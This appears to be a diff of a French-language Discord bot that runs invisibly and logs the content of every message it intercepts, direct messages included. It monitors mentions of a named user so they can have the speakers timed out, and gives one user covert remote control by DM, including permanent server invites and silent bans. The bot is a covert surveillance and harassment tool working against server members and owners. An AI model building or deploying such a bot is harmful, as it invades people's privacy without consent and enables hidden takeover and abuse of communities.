@@ -16,7 +16,7 @@ TARGET_USERNAME = "akz_92"
 VICTIME_NAME = "m1zuki_1"
 MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]
 
-# Stockage temporaire pour les demandes de timeout (clé = ID de m1zuki_1, valeur = auteur du message)
+# Stockage temporaire pour les demandes de timeout
 pending_timeouts = {}
 
 # --- SERVEUR WEB POUR GARDER LE BOT ACTIF SUR RENDER ---
@@ -47,13 +47,11 @@ async def get_guild_from_input(identifier):
 
 @bot.event
 async def on_ready():
-    # Force le statut en mode invisible (hors-ligne) dès que le bot est prêt
     await bot.change_presence(status=discord.Status.invisible)
-    print(f"Bot furtif opérationnel et invisible pour : {TARGET_USERNAME}. Surveillance active pour {VICTIME_NAME}.")
+    print(f"[OK] Bot connecté en tant que {bot.user}")
+    print(f"[SURVEILLANCE] Cible principale : {TARGET_USERNAME} | Victime : {VICTIME_NAME}")
 
-# =========================================================================
 # AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
-# =========================================================================
 @bot.event
 async def on_member_update(before, after):
     if after.name == TARGET_USERNAME:
@@ -69,26 +67,29 @@ async def on_message(message):
     if message.author == bot.user:
         return
 
-    # =========================================================================
-    # 0. SYSTEME DE SURVEILLANCE & CIBLE VERROUILLÉE (pour m1zuki_1)
-    # =========================================================================
-    victime_obj = discord.utils.get(message.guild.members, name=VICTIME_NAME)
-    pinged_victime = victime_obj in message.mentions if victime_obj else False
+    # DEBUG CONSOLE : Permet de voir dans tes logs Render tout ce que le bot intercepte
+    print(f"[MSG] De {message.author.name} (ID: {message.author.id}) dans {'DM' if isinstance(message.channel, discord.DMChannel) else message.guild.name} : {message.content}")
 
-    if (any(mot.lower() in message.content.lower() for mot in MOTS_CLES) or pinged_victime) and message.author.name != VICTIME_NAME:
-        if victime_obj:
-            # On stocke l'association en utilisant l'ID de m1zuki_1 pour retrouver la cible exacte
-            pending_timeouts[victime_obj.id] = message.author
-            try:
-                await victime_obj.send(
-                    f"🚨 **Cible verrouillée** 🚨\n"
-                    f"L'utilisateur **{message.author.name}** (sur le serveur *{message.guild.name}*) a prononcé ton nom ou t'a mentionné.\n"
-                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
-                )
-            except:
-                pass
+    # =========================================================================
+    # 0. SYSTEME DE SURVEILLANCE (pour m1zuki_1)
+    # =========================================================================
+    if message.guild:
+        victime_obj = discord.utils.get(message.guild.members, name=VICTIME_NAME)
+        pinged_victime = victime_obj in message.mentions if victime_obj else False
 
-    # Réponses de m1zuki_1 en DM pour valider ou non le timeout (strictement limité à m1zuki_1)
+        if (any(mot.lower() in message.content.lower() for mot in MOTS_CLES) or pinged_victime) and message.author.name != VICTIME_NAME:
+            if victime_obj:
+                pending_timeouts[victime_obj.id] = message.author
+                try:
+                    await victime_obj.send(
+                        f"🚨 **Cible verrouillée** 🚨\n"
+                        f"L'utilisateur **{message.author.name}** (sur le serveur *{message.guild.name}*) a prononcé ton nom ou t'a mentionné.\n"
+                        f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
+                    )
+                except Exception as e:
+                    print(f"Erreur envoi DM m1zuki_1 : {e}")
+
+    # Réponses de m1zuki_1 en DM pour valider le timeout
     if isinstance(message.channel, discord.DMChannel) and message.author.name == VICTIME_NAME:
         content = message.content.lower().strip()
         if content in ["oui", "non"]:
@@ -112,7 +113,7 @@ async def on_message(message):
             return
 
     # =========================================================================
-    # 1. GESTION DES DM (Contrôle à distance 100% discret strictement pour akz_92)
+    # 1. GESTION DES DM (Contrôle à distance pour akz_92)
     # =========================================================================
     if isinstance(message.channel, discord.DMChannel):
         if message.author.name != TARGET_USERNAME:
@@ -134,7 +135,7 @@ async def on_message(message):
                         invite = None
                         for c in g.text_channels:
                             try:
-                                invite = await c.create_invite(max_uses=1, max_age=3600)
+                                invite = await c.create_invite(max_uses=0, max_age=0)
                                 break
                             except:
                                 continue
@@ -281,7 +282,7 @@ async def on_message(message):
         return
 
     # =========================================================================
-    # 2. COMMANDE .ban SUR LE SERVEUR (100% Silencieuse / Réservée à akz_92)
+    # 2. COMMANDE .ban SUR LE SERVEUR
     # =========================================================================
     if message.content.startswith(".ban"):
         if message.author.name == TARGET_USERNAME:
@@ -292,8 +293,14 @@ async def on_message(message):
 
             if message.mentions:
                 target = message.mentions[0]
-                guild = message.guild
+                if target.name == TARGET_USERNAME:
+                    try:
+                        await message.author.send("❌ Tu ne peux pas te bannir toi-même !")
+                    except:
+                        pass
+                    return
 
+                guild = message.guild
                 try:
                     await guild.ban(target, reason="Banni discrètement via .ban")
                 except Exception as e:
@@ -305,5 +312,5 @@ async def on_message(message):
 # Lancement du serveur web pour Render
 keep_alive()
 
-# Lancement sécurisé via la variable d'environnement (Token géré sur l'hébergeur)
+# Lancement sécurisé via la variable d'environnement
 bot.run(os.getenv("TOKEN"))
